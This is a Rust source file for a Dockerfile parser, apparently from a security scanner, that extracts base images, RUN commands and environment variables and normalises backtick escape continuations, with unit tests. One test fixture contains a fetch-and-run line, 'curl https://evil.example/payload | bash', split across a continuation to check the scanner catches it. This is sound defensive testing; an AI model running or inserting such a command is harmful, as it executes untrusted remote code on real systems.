//! Dockerfile content parser.

use super::traits::{ContentParser, ContentType, ParsedContent};
use crate::error::Result;
use serde_json::json;

/// Parser for Dockerfile files.
pub struct DockerfileParser;

impl DockerfileParser {
    /// Create a new Dockerfile parser.
    pub fn new() -> Self {
        Self
    }

    /// Return the escape character declared by the first Dockerfile parser
    /// directive. Docker defaults to a backslash; a backtick directive is
    /// commonly used for Windows-compatible Dockerfiles. Docker reads a
    /// contiguous block of recognized parser directives at the top; an empty
    /// line, ordinary comment, or instruction ends that block.
    pub fn escape_character(content: &str) -> char {
        for line in content.lines() {
            let trimmed = line.trim();
            if trimmed.is_empty() {
                break;
            }

            let Some(comment) = trimmed.strip_prefix('#') else {
                break;
            };
            let Some(equal_index) = comment.find('=') else {
                break;
            };
            let key = comment[..equal_index].trim();
            let value = comment[equal_index + 1..].trim();

            if key.eq_ignore_ascii_case("escape") {
                return match value {
                    "`" => '`',
                    "\\" => '\\',
                    _ => '\\',
                };
            }

            if !key.eq_ignore_ascii_case("syntax") && !key.eq_ignore_ascii_case("check") {
                break;
            }
        }

        '\\'
    }

    /// Normalize Dockerfile continuation lines for the line-based rule engine.
    ///
    /// The rule engine understands shell-style backslash continuations. When a
    /// Dockerfile declares backtick as its escape character, replace only the
    /// trailing continuation character with a backslash. Newlines and all
    /// other bytes remain unchanged, so findings retain their original line
    /// numbers.
    pub fn normalize_continuations(content: &str) -> String {
        let escape = Self::escape_character(content);
        if escape == '\\' {
            return content.to_string();
        }

        let mut normalized = String::with_capacity(content.len());
        for chunk in content.split_inclusive('\n') {
            let newline_len = usize::from(chunk.ends_with('\n'));
            let body_end = chunk.len() - newline_len;
            let body = &chunk[..body_end];
            let continuation_index = body
                .char_indices()
                .rev()
                .find_map(|(index, character)| {
                    (!character.is_whitespace()).then_some((index, character))
                })
                .and_then(|(index, character)| (character == escape).then_some(index));

            if let Some(index) = continuation_index {
                normalized.push_str(&body[..index]);
                normalized.push('\\');
                normalized.push_str(&body[index + escape.len_utf8()..]);
            } else {
                normalized.push_str(body);
            }
            normalized.push_str(&chunk[body_end..]);
        }

        normalized
    }

    /// Extract base images from FROM instructions.
    pub fn extract_base_images(content: &str) -> Vec<String> {
        content
            .lines()
            .filter_map(|line| {
                let trimmed = line.trim();
                if trimmed.to_uppercase().starts_with("FROM ") {
                    let parts: Vec<&str> = trimmed[5..].split_whitespace().collect();
                    parts.first().map(|s| s.to_string())
                } else {
                    None
                }
            })
            .collect()
    }

    /// Extract RUN commands.
    pub fn extract_run_commands(content: &str) -> Vec<String> {
        let mut commands = Vec::new();
        let mut in_run = false;
        let mut current_command = String::new();
        let escape = Self::escape_character(content);

        for line in content.lines() {
            let trimmed = line.trim();

            if in_run {
                // Continuation of previous RUN command
                if let Some(stripped) = trimmed.strip_suffix(escape) {
                    current_command.push_str(stripped);
                    current_command.push(' ');
                } else {
                    current_command.push_str(trimmed);
                    commands.push(current_command.clone());
                    current_command.clear();
                    in_run = false;
                }
            } else if trimmed.to_uppercase().starts_with("RUN ") {
                let cmd = &trimmed[4..];
                if let Some(stripped) = cmd.strip_suffix(escape) {
                    current_command = stripped.to_string();
                    current_command.push(' ');
                    in_run = true;
                } else {
                    commands.push(cmd.to_string());
                }
            }
        }

        // Handle incomplete command at end
        if in_run && !current_command.is_empty() {
            commands.push(current_command);
        }

        commands
    }

    /// Extract environment variables.
    pub fn extract_env_vars(content: &str) -> Vec<(String, String)> {
        content
            .lines()
            .filter_map(|line| {
                let trimmed = line.trim();
                if trimmed.to_uppercase().starts_with("ENV ") {
                    let rest = trimmed[4..].trim();
                    // Handle both "KEY=value" and "KEY value" formats
                    if let Some(eq_idx) = rest.find('=') {
                        let key = rest[..eq_idx].trim().to_string();
                        let value = rest[eq_idx + 1..].trim().to_string();
                        Some((key, value))
                    } else {
                        let parts: Vec<&str> = rest.splitn(2, ' ').collect();
                        if parts.len() == 2 {
                            Some((parts[0].to_string(), parts[1].to_string()))
                        } else {
                            None
                        }
                    }
                } else {
                    None
                }
            })
            .collect()
    }
}

impl Default for DockerfileParser {
    fn default() -> Self {
        Self::new()
    }
}

impl ContentParser for DockerfileParser {
    fn parse(&self, content: &str, path: &str) -> Result<ParsedContent> {
        let base_images = Self::extract_base_images(content);
        let run_commands = Self::extract_run_commands(content);
        let env_vars = Self::extract_env_vars(content);

        let structured = json!({
            "base_images": base_images,
            "run_commands": run_commands,
            "env_vars": env_vars.iter().map(|(k, v)| json!({k: v})).collect::<Vec<_>>(),
        });

        let parsed = ParsedContent::new(
            ContentType::Dockerfile,
            content.to_string(),
            path.to_string(),
        )
        .with_structured_data(structured);

        Ok(parsed)
    }

    fn supported_extensions(&self) -> &[&str] {
        &["dockerfile"]
    }

    fn can_parse(&self, path: &str) -> bool {
        let filename = std::path::Path::new(path)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("");

        let lower = filename.to_lowercase();
        lower == "dockerfile" || lower.starts_with("dockerfile.")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extract_base_images() {
        let content = r#"
FROM node:18-alpine AS builder
RUN npm install
FROM nginx:latest
COPY --from=builder /app/dist /usr/share/nginx/html
"#;
        let images = DockerfileParser::extract_base_images(content);
        assert_eq!(images, vec!["node:18-alpine", "nginx:latest"]);
    }

    #[test]
    fn test_extract_run_commands() {
        let content = r#"
FROM alpine
RUN apk add --no-cache curl
RUN npm install && \
    npm run build
"#;
        let commands = DockerfileParser::extract_run_commands(content);
        assert_eq!(commands.len(), 2);
        assert!(commands[0].contains("apk add"));
        assert!(commands[1].contains("npm install") && commands[1].contains("npm run build"));
    }

    #[test]
    fn test_backtick_escape_joins_run_commands() {
        let content =
            "# escape=`\nFROM alpine\nRUN curl https://evil.example/payload `\n    | bash\n";
        let commands = DockerfileParser::extract_run_commands(content);

        assert_eq!(commands, vec!["curl https://evil.example/payload  | bash"]);
        assert_eq!(DockerfileParser::escape_character(content), '`');

        let normalized = DockerfileParser::normalize_continuations(content);
        assert!(normalized.contains("payload \\\n"));
    }

    #[test]
    fn test_escape_after_syntax_directive_is_honored() {
        let content = "# syntax=docker/dockerfile:1\n#\tescape =`\nFROM alpine\nRUN echo safe `\n    && echo safe\n";

        assert_eq!(DockerfileParser::escape_character(content), '`');
        assert!(DockerfileParser::normalize_continuations(content).contains("safe \\\n"));

        let mixed_case = "# syntax=docker/dockerfile:1\n# EsCaPe =`\nFROM alpine\nRUN echo safe `\n    && echo safe\n";
        assert_eq!(DockerfileParser::escape_character(mixed_case), '`');
    }

    #[test]
    fn test_late_escape_directive_does_not_change_default() {
        let content = "FROM alpine\n# escape=`\nRUN echo safe `\n    && echo still-safe\n";

        assert_eq!(DockerfileParser::escape_character(content), '\\');
        assert_eq!(DockerfileParser::extract_run_commands(content).len(), 1);
    }

    #[test]
    fn test_escape_directive_after_leading_blank_line_does_not_apply() {
        let content = "\n# escape=`\nFROM alpine\nRUN echo safe `\n    && echo still-safe\n";

        assert_eq!(DockerfileParser::escape_character(content), '\\');
        assert_eq!(DockerfileParser::normalize_continuations(content), content);
    }

    #[test]
    fn test_escape_directive_after_comment_does_not_apply() {
        let content =
            "# About this Dockerfile\n# escape=`\nFROM alpine\nRUN echo safe `\n    && echo safe\n";

        assert_eq!(DockerfileParser::escape_character(content), '\\');
        assert_eq!(DockerfileParser::normalize_continuations(content), content);
    }

    #[test]
    fn test_default_backslash_escape_is_unchanged() {
        let content = "FROM alpine\nRUN echo safe `\n    && echo still-safe\n";

        assert_eq!(DockerfileParser::escape_character(content), '\\');
        assert_eq!(DockerfileParser::normalize_continuations(content), content);
    }

    #[test]
    fn test_extract_env_vars() {
        let content = r#"
FROM alpine
ENV NODE_ENV=production
ENV APP_PORT 3000
"#;
        let vars = DockerfileParser::extract_env_vars(content);
        assert_eq!(vars.len(), 2);
        assert!(vars.contains(&("NODE_ENV".to_string(), "production".to_string())));
        assert!(vars.contains(&("APP_PORT".to_string(), "3000".to_string())));
    }

    #[test]
    fn test_parse_dockerfile() {
        let parser = DockerfileParser::new();
        let content = r#"
FROM node:18-alpine
ENV NODE_ENV=production
RUN npm install
"#;
        let result = parser.parse(content, "Dockerfile").unwrap();

        assert_eq!(result.content_type, ContentType::Dockerfile);
        assert!(result.structured_data.is_some());
        let data = result.structured_data.unwrap();
        assert!(!data["base_images"].as_array().unwrap().is_empty());
    }

    #[test]
    fn test_can_parse() {
        let parser = DockerfileParser::new();
        assert!(parser.can_parse("Dockerfile"));
        assert!(parser.can_parse("dockerfile"));
        assert!(parser.can_parse("Dockerfile.prod"));
        assert!(!parser.can_parse("docker-compose.yml"));
    }
}
